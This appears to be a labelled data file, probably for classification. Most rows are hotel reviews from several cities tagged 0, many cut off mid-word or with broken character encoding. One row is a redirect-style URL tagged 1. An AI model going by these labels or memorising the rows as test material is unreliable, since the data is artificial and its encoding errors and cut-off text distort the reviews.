"Great location, helpful staff Hotel Mate Mario is a cool hotel located near the Royal Palace and the Opera near a major walking street in Madrid. The staff was great, helpful with a great breakfast served until noon! This is helpful since dinner is usually past 10 pm. The location is great, right near a Metro stop, but also within walking distance of almost all major attractions. The old wing had an electrical outtage that was quickly fixed, but in the mean time we needed to have a room with electricity to get ready. We borrowed a room in the new wing - and the difference in rooms was substantial. If you get a choice try and stay in the new wing - everything was up",0

"unimpressed in barcelona i guess i should have heeded the review that stated é¥?¸¢his is not a luxury hotel.é¥?i will be the first to tell you in fact that it is nothing of the sort. it is a very nice hotel in a great location, but doné¥?? expect all those extra touches that make a luxury hotel so special. i love small, trendy hotels mostly because i love attention to detail and oddly that is exactly what the prestige neglected, the small details. many of the things i have to complain about are very small issues that alone would be silly to complain about, however as a whole turned our experience into a bit of a disappointment. firstly we were given a room on the main street although i had specifically requested a room off the street. our room was quite small (not too surprising for a metropolitan hotel room) and had no table and only 1 chair (which i thought was hideous and disturbed the otherwise well decorated feel of the room). one of the much advertised points of the hotel is é¥?¸isé¥? é¥?¸ersé¥?toiletry kits, my kit had nothing more than a comb and broken nail file. additionally the hotel does not offer conditioner. when i asked the front desk to send up some conditioner i was greeted with utter incredulity, the man at the desk told me, é¥?·otels in spain do not have conditioner.é¥?when i politely stated that the last hotel i stayed in had conditioner he actually asked me if i was sure the hotel was in spain (all in the entire incident was rather amusing, but frustrating none the less). they also tout their é¥?¸ree minibar,é¥?which consisted of a kit kat a couple of sodas and 2 small bottles of water. another supposed great feature is the fully automated lighting system, although very cool in theory, the reality was a pain. other small oversights: no washcloths, hooks for robes were located over the toilet and not accessible to the shower, no in room movies (not that we wouldé¥???e watched them, buté¥?, our room was skipped-over for turn-down service twice despite us being out for the evening, there were several tears in the carpet and holes in the artwork on the walls, etc... on a positive note the é¥?·?sk meé¥?staff was absolutely fantastic and did their up-most to accommo",0

"Our Wedding Vacation - Great Stay Our Majestic stay was wonderful (April 22-29). My husband and I and our wedding party (27 guests) had a great time. I would recommend this resort for a relaxing vacation and/or wedding.Hotel Grounds* Check in was painless. We got a cold towel and a Majestic drink upon arrival.* The grounds are beautiful, very well kept. You will always see someone in the gardens picking up leaves and taking care of the flowers/plants. * Rooms: very clean. The minibar was always re-stocked and rooms were cleaned early in the day. The hot tub in the room was awesome. We filled it up one night and put shower gel in it and made our own bubbles! The room was nicely decorated upon arrival and we got a bottle of champagne in the room! There are 4 buildings; we stayed in the 2nd building, first floor (Majestic Colonial Jr Suite, facing the pool). Our room# 2124. Great location for us; we were near the SPA towards the middle of the resort. We had guests stay in the 3rd building as well and heard no complaints. I would not recommend building4 for now since there is construction going on next to it. Construction should finish in Nové¥?8. The rooms are numbered 0 thru 50 starting at the lobby. As you get closer to the beach, the larger the number will be. I would try to stay away from rooms that are close to the beach if youé¥??e looking for quite days/nights. Most of the activities are near the wet bar (rooms35 and on). * The pool is so relaxing. We swam from one end to the other. We brought a floater with us, but couldné¥?? find a way to inflate it, so we ended up not using it, and still had a great time.Service* Everyone was really nice. Make sure you bring some change for tips. Some of them really go out of their way to help you. Excellent service.* The check-in lobby is full with people so make sure you allow extra time to check out the day you leave. Also, make sure you bring your alarm clock if you want to wake up. Out of 4 times my mom called, she only got 1 wake up call. Also, phones in the rooms doné¥?? have answering machines. If someone calls to leave a message, you will have to call the front desk. Not reliable, I didné¥?? get any of my messages.Food* Contrary to many reviews, we thought the food was really good at all restaurants. The only one we didné¥?? try was the Caribbean/Dominican one since we heard from guests it wasné¥?? as good as the other ones. Definitely go to the steakhouse and seafood restaurants to get both the lobster and the chateaubriand. The buffet has great variety. Leave room for dessert; they are really good, specially the cakes. Keep in mind you need reservation at the Gourmet and Japanese restaurants; they book rather quickly so make sure you make reservations the first day youé¥??e there. As for the dress attire, just doné¥?? go in a bathing suit! Shorts and dress/Hawaiian shirts are ok for men.* Doné¥?? drink the tap water! My father in law accidentally drank some and got sick for a day. They use bottled water at the restaurants. Ice is safe. Entertainment* The lobby bar (first or second floors) were the best in my opinion. Make sure you try the mamajuana, local drink. Some of the drinks at the beach were very sweet, but overall really good quality for an all-inclusive. * The gym had a muski smell to it. * Entertainment: the disco had a pool table, bar, and dance floor. Variety of music, meringue, bachata, salsa, and regueton. Did not go to the casino. Saw the Michael Jackson show; it was entertaining.The Wedding!Larissa was our wedding coordinator. She is great! She did a good job and set everything up exactly how we wanted it. We met with her for about 20 mins and went over all the wedding details. We decided on the bouquet, gave her our cake topper, placecards and seating charts, and music for ceremony. Everything was done perfectly. She always made it a point to stop by our rehearsal, reception dinners to make sure everything was going well.We had our rehearsal dinner at the buffet. We had 27 guests. The table was decorated with flowers and candles. Very nice. The service and food was good. Benito was the server. We brought tote bags (one per room) and handed some of them there é¥?we gave the rest out at the plaza bar the night before. The Plaza bar closes at midnight. The lobby bar is really close to it so if you want to keep the party going, you can go there until it closes at around 1am.I had my hair, make-up and nails done at the SPA. The prices are a little steep in my opinion, but they really do a great job. My hair turned out beautiful; just bring them a picture of what you want. In case you forget it at home, doné¥?? worry! é¥î?hey have a pretty good selection of pictures with hairstyles. Larissa can help you set up the appointment before you leave. The wedding was at 3pm; I started getting ready at 11am. I doné¥?? think you need that much time, but I didné¥?? want to me rushed é£¦?br/It started raining (or should I say pouring!) about 30 mins before the ceremony. We had originally planned our wedding at the gazebo. The location was changed to an indoor room, conference/salon type. The alternative was the lobby, but thereé¥??? no privacy there. Larissa kept me well informed of the up",0

"disappointing weekend at best western loyal inn, seattle this hotel is on the seedy edge of seattle. check in was ok and the desk clerk was helpful with planning a city tour. upon entering the room my friend and i were barely able to wend our way between the overlarge pieces of furniture and beds. the opening to the dressing room/closet/vanity area was less than 23, located directly off of the entry area to the room. there were a total of nine lamps and wall fixtures, of which only 2 could be lighted. they offer a nice breakfast, included in the price of the room, but the eating area becomes quite messy as the morning passes. there seemed to be a shortage of staff, at least while we were there. it was a big football game weekend and the hotel was at full occupancy. the bed linens were said to be new, but the mattress and box springs were very worn and shabby. the color scheme of the draperies, upholstery and bedding was disconcerting. we wrote a letter to the corporate headquarters detailing our dissatisfaction and received a quasi form letter explaining that they are in the process of redecorating some rooms, so the rooms might have had both old and new furniture in them. no other excuse was given for the lighting problems. this particular room should really not have been offered to guests. usually best western has been quite satisfactory, but this occasion was not up to their advertised standards.",0

"very good hotel i stayed here for a few days last week. the hotel is very clean and at a great location (quiet street, within walking distance of the west village and about three streets away from the blue and red subway lines). the cable was a little hit-and-miss(movies would freeze periodically, i only ad access to about four channels in my room), and the room is awfully small, but for the price it's well worth it. each room has a private shower and a pretty decent view. there were never any other guests using the shared bathroom(s) when i needed to go, so that was not a problem. if you're looking for a very good value in a very nice, laid-back nyc neighborhood you have to stay here.",0

"Very enjoyable at Casa Fuster I was a little concerned upon checking in because I heard a guest complaining about something or other, but all in all we were well taken care of and given a room to our liking. We had to see a few rooms before deciding on one we liked best. My wife and I want to be as comfortable as possible when we travel, so it's not uncommon for us to look at several rooms before deciding on one. I'm sure we drive the staff bonkers, but I wanna be comfy! Sometimes it's a cleanliness issue, sometimes it's a wear and tear issue. At Casa F I'd call it a wear and tear issue. The hotel has only been open two or three years, but hotel years are like dog years. Sadly guests don't treat hotels the same way they treat their own homes...at least that's what my presumption is. Perhaps I'm wrong. In any event, the hotel is quite comfortable and in a nice area that is quiet and appeared to be quite safe. The staff is very friendly and the breakfast is incredible. I'm not one to eat breakfast, but at Casa Fuster, bring it on. They have the most delicious breakfast buffet, I dream about it. For someone who really doesn't enjoy eating, I absolutely loved the breakfast there. My wife has stayed there a couple of other times while traveling and has noticed a bit of wear and tear, but again that's the nature of the beast. During her first stay, the hotel was only open for about two weeks. As noted above, a couple or three years has shown itself. Nevertheless, I enjoy the hotel and can vouch for the staff by saying that if an issue arises and you're not happy with something, they do whatever they can to accommo",0

"wonderful experience and highly recommended! we stayed at the omni two years ago and had a great time. we returned last month for a saturday night stay and found it just as wonderful. this hotel is exceptionally well managed, clean and inviting; guests are made to feel welcomed and valued. for example, at check in last month they were out of keys for the in-room mini-bars. they immediately arranged to send a free mini-refrigerator to our room so we would have a place to chill the champagne we'd brought with us. our room was spacious and the bed was exceptionally comfortable and quiet. as select guest members we get free coffee, orange juice and a paper delivered to our room in the morning (we used our champagne and the hotel's free orange juice to make mimosas). this was followed by the delicious buffet breakfast, included in our room rate. the hotel is next door to moca and virtually across the street from the dorothy chandler, ahmanson theater, the opera etc. we are opera and theater buffs so this is a great base when we attend performances.our experience last month was so terrific that we decided to return this weekend to enjoy the show must go on package. the $229 room rate includes a $100 dining certificate to noe, the restaurant located in the hotel, plus the breakfast buffet for two, a wine amenity, free town car service to and from the dorothy chandler and valet parking. all in all an amazing deal- break it down and the effective room rate is almost ridiculously low . i'm already impressed by the omni for this trip because a couple of days ago i received a call from the concierge asking me if i wanted them to make dinner reservations at noe so we could use our $100 dining certificate, and inquiring about whether we wanted red or white wine for the wine amenity. talk about a hotel having its act together! can't wait to spend the weekend there!",0

"sterile but right price this hotel was a 7 pillows-on-the-bed hotel which at first glance seemed very nice, but our room had two major problems. we had luke warm to cool water in the shower - the water simply would not get hot - and the toilet did not flush properly. we worried every time we used it that it would overflow. we were only there one night so we didn't complain but we told the desk about the problems when we checked out. the staff was friendly and helpful - gave us a wine opener at no charge. the bedding was first class. we booked through priceline and got a terrific discount -- bid was $72 plus tax to a final bill of $88. we turned in our car before going to the hotel so we didn't have to pay the high cost parking and the shuttle the next morning was on time, no problem. in fact, the rental car shuttle delivered us directly to the hotel which was handy. we'd stay there again for an early morning flight - especially with the same priceline bid - but we'd check the toilet and shower before unpacking in case we needed to change rooms.",0

"loved it Have stayed at Royal Suites Palladium, and Royal Suites Occidental Xcaret and found the Ambar by far the best. The resturants on the Ambar side are all good-way better than the resturants at the Bavaro and Principe. No problem with dinner reservations they were all made for us on arrival at around 7-7:30 which was perfect for us. If you wanted quiet -you had it at the Ambar pool and lobby -if not just go to the other pool or in the evening hop on the train and head over to the square and catch a show-three were outstanding; Lion King, Legends and Michael Jackson.Then if you still want more there is a choice of a live band,the Karokee bar or casino and from 12-3am the Disco.The place is beautiful and sparkling clean. We had room in building 67 which is an excellent location to several resturants, beach and pool. Staff were very friendly and most accomadating at every place within the hotel we went to. People did get up early to save chairs under palapa's -we were lucky to find a nice couple whom we dubbed Mr.  Mrs. Tim Horton who very kindly saved us a spot every morning. Things aren't 100 percent yet-but after talking to management-they are working on it. I had no complaints other than trouble with room key. Normally like to go to different resorts but fell in love with the Ambar and will definately go back. Travel ",0

"old world charm i was in la for business and spent 2 nights at the biltmore in downtown la. it is a grand old hotel, which has both pros and cons. the pros include a room with high ceilings and wide entryways, which give one the feeling of space. the furnishings are tasteful, if a bit dated. closet / dresser space is limited, though. the main drawback for me was the lack of electrical outlets and the outdated (at least in appearance) nature of the existing ones. the rest of the hotel itself offers fantastic photo ops, from the ornate lobby and grand hall to the dining room frescoes and chandeliers...even the pool / fitness center! i would recommend this hotel if you are staying in the downtown area, although there is not a great deal to do in the evenings.",0

"a very pleasant stay to celebrate my birthday, my housband and i decided to make a trip to l.a., and after an exhousting search, decided to book the palomar in westwood. it was our first time in the area, and were very pleased with the location of the hotel. it's on wilshire blvd and eventhough its not on a commercial zone, (the westwood village its about a 10 min. walk) the area its beautiful, full of trees and charming houses, we had the chance to walk in the neigborhood and were delighted ! the hotel its very modern, super clean and well decorated. the rooms are very comfortable, the bed is super, the pillows and linens are very nice, and the bathroom has a nice size too. very good service at the restaurant and the food is good but a little expensive. a plus are the wine hour from 5-6 p.m, and coffee and tea bar in the morning. all the staff is very attentive.also i want to recommend if you're in the area:vincenti restaurant its the best italian i've ever visit!!! it's in brentwood and its a 5-8 min. cab ride, very well worth the visit.",0
"great airport location, tired property i recently stayed here for a two night business trip as i needed close proximity to lax. the hotel proximity to lax is great. the facility is an older property that has lost some of it's shine. our room was clean, comfortable, and quiet. both the housekeepong and front desk staffs were efficent. while we found it to be a decent place to stay for a short trip, i would not recomend it as a base to explore the la area. the pool area is dismal at best. use it for business and early morning flights.",0

"impressive hotel - slow shuttle service my wife and i stayed at this hotel for one evening during a recent trip to the area. we stayed the night here as we had an early flight out the next morning and wanted a place close to lax.the pro's:this is a very impressive hotel, especially for being in the lax area. the lobby is very modern and impressive and the rooms were very nice (flat screen tv's, large size, etc). if i had to stay in the lax area, i would chose this hotel.the con's:my only negative experience (which is why i gave the hotel 4 stars instead of 5) was with the shuttle service. we dropped our rental car off in the evening and took the hertz shuttle back to the airport. we previously confirmed with the hotel their shuttle ran the airport route every 15-20 minutes. after 30 minutes, no shuttle. we called the hotel and the front desk insisted the shuttle ran every 15-20 minutes. after about 45 minutes standing by the curb waiting, the shuttle arrived. we were to the hotel in 5 minutes, but the wait at the airport dampened the moment. to give their credit, our wait in the morning to the airport was only about 10 minutes.",0

"excellent value for money we stayed at this hotel for two nights in september and it was excellent.as we were in a city centre i asked for a room on a high floor in a quiet area. when we checked in we were given room 711. this is on the top floor (i think) and right at the back. the room was really quiet and just what we wanted.we flew into town and got the bart train into the city. this was really easy and cheap $5.15 each and the hotel is only about a 5-10 walk from the train stop. if you do this i would however recommend you walk up powell and along geary st as opposed to taking a direct route from the train station to the hotel like we did. unfortunately this takes you through the homeless area which wasn't too pretty.the hotel itself is clean, the room was big enough for us with an excellent bathroom. the shower was low but this seems to be the done thing in america as every hotel we stayed in had a low shower. the reception staff were helpful and gave us a handy map of the city which was excellent. they also marked out any areas to avoid.the breakfast is basic with coffee, juice, toast and cakes but this was more than enough to enable you to get out sightseeing quickly. the location was good, really close to the shops. the walk to the pier, alcatraz takes about 40 mins and involves a few hills, so if this is your main focus you might want to stay a little closer or get a tram.the only downside was the window in our room didn't lock, however when we looked at the drop out from it we realised no one would try it.in summary an excellent hotel and i would recommend to anyone going to san francisco who doesn't want to spend all their money on hotels",0
"beautiful hotel i stayed room 147 for 3 nights last month. the room was a little old, but it was clean so i did not mind. i really liked the warm spanish design of the room interior. the big walking closet was convenient. the bedding sheet was so smooth that i enjoyed my sleep. the bed curtain was pretty.the gardens were very nice. i enjoyed them everytime i walked outside. the bar and restaurant were great. i especially enjoyed sunday branch buffet. there were 2 buffet prices. one for $19.99 and the other for $29.99. $19.99 buffet was buffet only. $29.99 includes the buffet and one order from the branch menu. the menu for the buffet and branch was sort of difficult to understand this system. it does not state clearly what these prices include. the buffet was excellent. i was already full with the meal so i didn't a room to taste all the deserts unfortunately. there were several kind of deserts, which looked refined. i ate only one desert, which was a rapsberry square cake. it was a small one in a big plate. it had a tangy strong rapsberry taste and i personally liked it much. the buffet was so beautiful that i feel like going back to phoenix only for that.the steam room and juccuzi bath were located in alvadora spa, but they were free to use anytime from 8am - 8pm. they will give you a locker room key.parking was all convenient vallet parking.only downsizing was that i had several mosquito bites in the room and outside of the room.overall, it was a great hotel and and i enjoyed my 3 nights!",0

"thanks for the wonderful upgrade! when we arrived at the squaw peak peak we were greeted by a very friendly staff and during check-in i asked for a free upgrade (rent a ton of hilton rooms throughout the year) and the desk manager gave us a wonderful casita (town home). ours had a pool and hot tub attached to it that could be used by the public, but it was very quiet and felt like it was just ours to use. unit # 3243. our unit had a kitchen, 2 bathrooms, and a nice dresing area. the bedroom had a king sized comfy bed and it seemed clean. a little outdated and one of the windows was too high to reach the blind leaving a direct view into our bathroom at night (wouldn't want to be spotted naked). it also had a water fountain outside by the pool and we slept perfectly to the sound of the water. this is a great place for kids and families, but still quiet enough for just the two of us. we strolled around the property and it has a very cool water park, mini golf, and fun stuff for the kids. you can't bring food or bevs from the outside into the pool area so a few drinks in the sun can get a little pricey. it was to chilly to use the waterpark for a couple of adults, but the kids were having a blast.we did eat at the hole in the wall rest and the food was very good. i just didn't get the feeling that it was very clean in there.walgreens is just down the street and they have a liquor store attached so you can find all your needs there.we ate at a fun rest called the fish market just a few exits down on 51s and it was very good! the chef changed a few things for us and didn't mind. (i like pasta instead of rice). although, they had security and so that made me a little uneasy about the area.",0

"great hotel for family we stayed at this hotel mid november. there was myself, husband, son daughter-in-law and 3 grandchildren. the children's ages 6,4, 16 months. it was a two bedroom on the 9th floor. one bedroom had a king bed, the other had 2 twin beds. it also had a queen pull out couch bed. we had more than enough room. if my husband and myself wanted quiet we just went into our room. you can't hear what goes on in the other rooms. it was very nice. each room had it's own tv. the help was very nice and they cleaned our place everyday. it had a kitchen that they stocked with milk, orange juice, bagels, sugar, cream coffee.it is located on east 49th st. between 3rd ave and lexington ave. so you are close to a lot of stuff. next door there were 3 restaurants. on the corner there was a place to get breakfast if you wanted. all in all it was a great stay and would definately go back. oh i asked what the difference from our place to the penthouse, the front desk clerk told me the penthouse has plasma tv's.anyway if you have kids or a few friends you are going to new york with the best western hospitality is a good place to stay.",0

"relaxed at the palladium we just got back from the palladium punta cana. we did a lot of research and read lots of reviews and this narrowed our search to go there. this was the first time for us in the dominican and have to say it was a great trip with few problems. we were 2 families of 4 including 4 teens. we left toronto on skyservice and they have great service. arriving at the airport you are greeted by 2 lovely ladies for a picture taking which you can pick up on your way back for $8 or more. got our luggage and were told to stand in a line with hundreds of other people, in the heat, to find out what bus to load on for transfers. our friends decided not too and found the bus on their own. they came and got us out of the line and we were off to the resort on air conditioned bus. the trip there was about 20 - 30 minutes. we got our rooms right away but our friends had to wait for theirs so we put their luggage in our room, changed and went to the buffet for lunch and explored the grounds which are so beautifully maintained. make sure to take a train ride to get an idea of how big the property is and where everything is. rooms: first thing we noticed in our room was a musty smell but once we turned the air on for a while the smell was not so bad. the air and lights will only work when you insert your room key in room so try to get an extra card. i did have a problem with the bed feeling dampish all week. found the beds and pillows hard as well. i brought my own pillow and was so glad i did. i should have asked for another room but did not feel like going through the trouble. other than that the room was very spacious and nice. the jacuzzi tub was in a very big bathroom and preferred that than having the tub in the middle of the room. we did find it a little hard to communicate with the staff but we managed to get what we needed and they worked very hard cleaning our rooms and making all those towel animals. may be helpful to learn a few spanish words before you go like 'facecloth' and 'remote batteries' which we ran out of. other than that we loved the location of our room. block 2000, right by the pool, beach and buffet restaurant. great for running back to your room for bathroom breaks. beach: so beautiful and clean. lots of chairs but you had to get up pretty early to reserve ones under the huts. luckily we had early risers with us and were able to get those huts!!! still lots of shady spots under the trees and a nice ocean breeze to keep you cool. also loved the big waves to jump in.restaurants: there were lots of restaurants to choose from and lots of choice. did not need reservations for the a la cartes, but waited almost 2 hours to get into the italian since it was hard to accoma",0

"overpriced, over promised, under delivered and lied i'm american, based in dublin with an irish other half. we've both seen the inside of plenty of bbs throughout ireland and the uk to have certain expectations. before we arrived, the edward ii seemed like a godsend é¥?sf was our first stop after a very long flight, we needed a place for our first night, and most of the city was booked out. what our stay actually became boiled down to the following:the room: advertised as a classic queen but really a drag. cramped and clammy with shabby furniture sporting stains, burn marks, gnawed corners. sink next to the bed and not in the bathroom. wires *everywhere*.the ick factor: found a old hand-towel stuffed in the windowsill to collect moisture. hair on the shower walls... and on the floor. the bathroom: toilet did not flush. did. not. flush. the noise: construction in the lot next door started at 6am, housekeeping started at 8am. the shared bathroom for the floor was on the other side of our headboard; it also served as phone booth for guests looking to multi-task at 2am.but, most importantly...the staff: at check-out i rationally and civilly complained to the woman at the front desk. she didn't handle the complaint but promised to let the manager é¥?who wasn't in that day é¥?know when he returned and he would contact us to resolve the issue.(later, after seeing a photo of the owner/operators on their site, we realised the manager hadn't been away, but in the next room the entire time.)after returning to ireland we called the hotel to repeat the complaint and got the same woman who checked us out. after being told it was our own fault we didn't complain sooner and more vociferously, i let her know about eu laws allowing charge-backs on credit cards for failure to deliver service as advertised... and only then was i given 20% back from the cost of the stay.",0

"one of the better hotels in the lax area we staid at the renaissance montural for one night in june 2005 after an 11 h flight from frankfurt, germany. this is a relatively small hotel (compared to the other airport hotels) that offers more charme, privacy and personality than most of the surrounding chain hotels. the standard rooms are well equipped but not very spacious---however, since we only staid for one night (as most people do), room size was not so important to us ... staff was friendly and responded quickly to our needs. all in all it was a good value (since we got the aaa rate), and we would probably stay there again.",0

"Great hotel once you can find it First thing - know how to get to the hotel. If you catch the bus from Captial Airport, take Route 3 to the Beijing Train Station. When you alight, ignore the touts wanting to give you a lift on their rickshaw - I can tell you from experience that they will leave you stranded (but at least it will be near by).Head from the bus in the direction that the bus is facing and on the same side of the road that you got off the bus on. At no time do you have to cross the main road. As you follow the path, you will go past a couple of walk side shops and then finally through to the forecourt of the Beijing train station. This should take 2 minutes.Cross the forecourt staying close to the road. There will be people everywhere. You will be walking in an easterly direction. Once leaving the forecourt, keep walking past some shops and you will get to a bus interchange. Walk past this and you will see a road to the right. There is a sign post with blue signs in Chinese and then there is one of the bottom that is red indicating a Hutong starting with D (as I am currently staying in the hotel - I will get the name and up",0

"affinia doalot it could be called.... as we stayed here just recently while in town for a long weekend. the management team is supurb here and the accomodations are some of the biggest - space-wise - that you will find in nyc. as usual we booked our stay on expedia.com, and upon checking on their website for our confirmation # less than 24 hours before check-in, we realized that the rate for our junior suite room had dropped. the expedia agent called the hotel and spoke with the front desk manager and the manager waived the cancellation fee and we rebooked at the lower rate. this was a positive and exceeded my expectations on what the hotel may do as a result of our inquiry. checking in was a breeze. we encountered a couple of problems with the room service and also the smoking (the hotel is all non-smoking) - and a barking dog (the hotel is very pet friendly so you may hear this during your stay) in the room directly across the hall from us - but all was taken care of upon my bringing it to the manager's attention. we were promptly re-located to another room (junior suite) on a higher floor (29 vs. 18). the view from 29 is amazing - if you can imagine - as you can see the chrysler tower to the north and the east river to the east.....it's breathtaking both during the day and even more so at night. the hotel room itself is huge - as stated before - bigger than most even beyond the big apple. most / or all junior suites i was told are in the corners...giving you ample room and the view i spoke of. the amenities are first rate in the room, an umbrella stand with an umbrella, and aveda toiletries. i was impressed. the decor could use a minimal up",0

"convenient place for a lay-over i stayed 1 night here on a lay-over from sin-lax and lax-mob to break up what would have been a totally unbearable journey.transport was free by courtesy shuttle from lax to the hotel. to catch it, you have to go out of the airport onto the curb following the signs for hotel courtesy shuttle and just wait around for the bus that flashes marriott/renaissance to pull up. it's a short 5 minutes journey from the airport to the hotel, dropping off at marriott first.room was large, comfortable beds with an over surplus of pillows. not that i am going to complain of course. although i booked for a breakfast to be included in the room rates, my next day flight was too early for me to consume it at a reasonable time so the front counter was kind enough to convert it to free internet access at no extra charge.the room only comes with a shower and no tub. a shower curtain prevents you from wetting the other parts of the bathroom but doesn't stop the water from flowing outwards especially if you have it running at speed for a while.the room was very well sound proofed and although you can see planes landing about a kilometer away, you can't hear them.i spoted a burger king next to the hotel. there are restaurants on the ground but i did not avail my self to them, choosing instead to turn in early for the next day flight.next morning was a breezy check out followed by the same easy shuttle ride to my connecting flight. it happens that the bus pulled up immediately when i got to the lobby so there was no waiting time needed at all!all in, plenty good hotel. will stay here again.",0
"great - just 1 irritation (ok 2) this hotel is less than a 5min stroll to the walk of fame. our room was enormous, clean, and newly renovated. front desk staff and concierge all very friendly and polite. recommended a private tour that we thoroughly enjoyed - (even though quite pricey). $20 per day to park, but priority members get a slight discount. they have a free shuttle to universal studios, that even took us to our restaurant for dinner on the friday evening.something that really annoys me about holiday inn's is that even though you pay extra to have bed breakfast, they then whack you with extra taxes (you pay tax on the entire price of your stay - so why do they tax you again on the price of the breakfast???). i was also not impressed that they automatically add 20% to any check/bill as a gratuity, and then have the cheek to leave additional space for another tip - we were caught out the first time because we didnt check properly !",0

"great hotel we stayed at the tuscan inn for four nights last week. i was traveling with my 83 year old mother who has a hard time walking long distances and my 79 year old aunt. the hotel was great because it was so close to the cable cars, the wharf and had a grocery store and drug store across the street. the staff was terrific. we called for an extra luggage rack and not only was it there when we got back from dinner -- the luggage was on it. our room was bigger than i was led to believe through the other reviews. i asked the desk clerk when we checked in if the rooms were as small as they said they were in the reviews. she gave us a courtyard room -- she said they were larger! we turned in our rental car before we went into san francisco and didn't miss it. we used super sightseeing to go to alcatraz and the city tour. and, used the grey line tours for yosemite and the muir woods/sausolito tours. both companies picked you up and dropped you off at your hotel. although, super sightseeing is only a block from the hotel and grey line is about 2 1/2 blocks from the hotel. we used the cable cars to get to china town and union square.i would definitely use this hotel again.",0

"we plan to stay at this resort again! the prior review saying warning had a misfortunated event and i am sorry you were not accommodated by the manager. all things aside, that situation was very rare and should not affect others who would like to stay at the legacy golf resort. we truly had the best experience with this resort from the time we arrived to every level of service. i called ahead confirming the reservations and the 1 bedroom condo with golf view was incredible. thanks expedia! the legacy golf resort was awsome and we look forward to visiting again soon.",0

"stay on nob hill we stayed at the stanford court from april 19 until april 24, 2004. i called ahead and asked for 2 adjoining rooms for our group. the staff was very courteous, the lobby beautiful, and the rooms we requested were waiting for us. hot tea and a newspaper in the a.m., clean and lovely rooms, and turndown service at night! what a nice hotel! we were at the intersection of the two cable car lines, 2 blocks from china town, and 3 blocks from union square. sightseeing was so convenient. i will stay there next time i go to san francisco.",0
"liked the holiday inn before i start my review i like to tell people my expectations! i like a clean, cheap hotel that is near all the sites in a city. i believe you get what you pay for!! in the hollywood holiday inn this is certainly true. the hotel has a great location for exploring hollywood. it is on a busy road less than 5 minutes walk to hollywood boulevard. we felt very safe at all times of the day walking to and from it. our room was very clean and spacious and a nice size. we never ate in the hotel but the menu seemed good. the pool is average sized and the gym is tiny but we were too busy sightseeing to use these. we didnt have a car and managed just fine with the buses and metro that are located on hollywood boulevard. the hotel also run a free shuttle to universal studios which is very handy. we found all the staff to be very helpful.overall we enjoyed our stay here, it was perfect for what we wanted, a cheap cheerful clean place to lay our heads!!",0
"i loved it i loved it from the moment i walked in till i left 7 days later. the beds were out of this world, . the service was great, every person we spoke to was very kind and helpful. i would stay there again and again given the chance.",0

"our first year staying at best westerns this year on our vacation we stayed at 3 different bw locations. we were pleased with all of them. at the executive we booked an upgraded room and were satisfied with everything even if it was a little expensive. the room had a couch, chair footstool, fridge, microwave, king size bed and a few touches that made it a little more luxurious than average. we had a great view of the space needle and we took the monorail down to pike place market and walked around the waterfront and pioneer square. glad we didn't have to drive in seattle as that alone could have ruined our visit. this hotel was cheaper than one on the waterfront or right in the downtown business district and the monorail or the free zone for the bus make getting around easy. we actually like to walk so did that except for the mono back and forth from the space needle. the front desk gave us directions to the ferry for our trip to the olympic penisula and were in general courteous and helpful. all in all we'd stay here again if we ever return to seattle.",0

"bug bites! stayed at this resort from jan 17 - 24. the room was ok, seemed to be clean, but was",0
http://www.koubook.com/touch-mode-switch/touch?return_url=http://www.google.com,1
"A Nice Vacation! We were at the Ocean Sand/Blue Resort from February 10th - 17th. There were 6 of us, 2 in our early 60's, 20 in the early 50's and their 2 teenage daughters. Our trip out of Toronto was with Skyservice and we were in line at 1:15 pm for a 4:30 flight; as a consequence, when we snaked our way to the counter, we were first for our flight and got 6 across for the exit row (30 on the 757's). TIP: If you're on that flight, eat at the airport before boarding. The flight didn't get to PC till 10 pm PC time and by the time everybody cleared customs, found the bus, arrived at the resort and checked in, it was after 11 pm. Our bags didn't get to the room till after midnight. We had emailed the resort earlier to try to get a unit close to the beach and an upper floor. We got unit 9 (the second closest to the beach) on floor 3. The rooms were not adjoining but close.By the way, all previous reviews for this resort mentioned the fact that beach towels were provided in the room upon arrival. No longer. I guess they must have just switched to the card process. No big deal other than the first morning when you had to exchange the cards for towels. The booth opened at 8 am PC time (meaning about 8:15 am).  There are 2 large pools, the quieter blue pool, the more active, noisier yellow pool and, finally, the large beach area. We used the beach a couple of days and stayed at the blue pool the other days. I refer to the colour because the umbrellas and lounges are either blue or yellow. The blue lounges have mats, the yellow are just the canvas material. TIP: Want to ensure a location with an umbrella (at this time of year, anyway?) at 7 am--no problem. at 8 am--maybe a few locations left. at 9 am--forget it. (add about 1/2 hour to times for beach). Not much point repeating everything that many other reviewers have said since I'm sure you're doing as we did .... read a whole bunch of reviews on the site to get a feel for what to expect. I will mention a few things, though. The rooms ARE dark with their use of those little power saver bulbs. I brought down 2 - 150 watt bulbs for the room but should have brought down 1 more for the bathroom. My wife had a hard time for makeup purposes.  I never smelled a musty odor in the room as others have mentioned. We did fall victim to the lack of hot water/low pressure a couple of times during the week---usually between 4:30 and 5 in the evening. Towel replacement in the room was a bit on the hit and miss at times. One day, the bath towels weren't replaced. Our 2 facecloths on day 1 became 1 after that but no big deal, we brought a couple of our own. One thing I noticed was that this resort only provided 1 wastebasket per room, not two. You don't notice the inconvenience of not having a second one until there isn't one. g No show stopper....just an observation. The food was ok, not terrific. We ate at 3 of the al a cartes, the Mexican (poorest service and food in our collective opinions), Dominican and the Italian. We found it funny seeing all the Americans line up to get into the American every night. No place like home, I guess. The buffets were varied--especially at breakfast. Whatever you could want, including fresh donuts made while you wait, they had. The beach buffet had less choice than the main and was always crowded at lunch, being on the smallish size. I've been to resorts where you had to book dinner times by lining up in the morning. A pain in the you know what. I really like the first come-first serve here, even if it means you lined up for a bit at the al a cartes (remeber, we were a party of 6). The entertainment....well, they tried. Just consider it about an hour a night to kill some time. Their rendition of Chicago (condensed version) was pretty entertaining but the stuff other nights was pretty lame. My wife needed access to the Internet and it was there in a small building off the main lobby area. $7/30 minutes or $4/15 minutes. All times had to be used in 1 session. Grounds were terrific looking and clean. Staff were friendly. since we were nearer the beach area rather than closer to the lobby/restaurant area, there was a 6 or 7 minute walk each time from 1 location to the other. Seemed longer in the hot sun (big problem, eh?). There is a shuttle that seemed to circle the grounds every 15 minutes or so, if so inclined. The weather was great for us all week. Every day in the mid to high 80's and not a drop of rain. Nights were in low 70's I expect. TIP: Our checkout was 1 pm for a 6:30 pm trip to the airport. Even if we did want to pay for a late checkout, we couldn't as the resort was overbooked for the next week's people coming in. HERE'S WHAT THEY DON'T PROMOTE but have available. A COURTESY ROOM. Here's how it works. The resort sets aside a block of rooms not available for weekly guests. At checkout, you're entitled to 1/2 hour in one of these rooms per room booked by your group. So, for instance, since there were 6 of us (3 rooms booked), we could have had 